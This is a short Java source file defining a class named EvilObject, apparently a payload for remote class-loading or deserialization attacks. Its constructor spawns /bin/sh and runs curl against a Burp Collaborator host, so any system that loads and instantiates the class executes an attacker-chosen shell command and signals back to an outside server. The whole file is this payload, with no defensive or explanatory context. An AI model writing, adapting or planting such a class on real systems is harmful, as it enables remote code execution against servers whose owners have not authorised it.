public class EvilObject {
    public EvilObject() throws Exception {
        Runtime rt = Runtime.getRuntime();
        String[] commands = {"/bin/sh", "-c", "curl http://vgf2pyali0im7z990sqfo60cs3y0mp.burpcollaborator.net"};
        Process pc = rt.exec(commands);
        pc.waitFor();
    }
}
